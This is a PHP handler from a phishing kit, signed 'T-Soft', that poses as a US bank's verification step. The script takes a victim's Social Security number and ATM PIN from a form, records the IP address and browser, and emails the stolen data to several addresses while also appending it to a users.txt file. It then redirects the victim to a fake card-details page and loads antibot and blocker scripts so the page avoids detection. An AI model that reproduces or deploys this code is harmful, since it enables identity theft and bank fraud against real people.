<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include('../system.php');
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$message .= "--------------US Ban3 Q Info---------------------\n";
$message .= "SSN            : ".$_POST['ssn']."\n";
$message .= "ATM PIN           : ".$_POST['atmpin']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------ By T-Soft  ---------------\n";
$cc = $_POST['ccn'];
$subject = "US  BAN3 Q INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: T-Soft <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($email1,$subject,$message,$headers);
mail($email2,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../../users.txt', 'a');
fwrite($text, $message);
header("Location: ../card.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>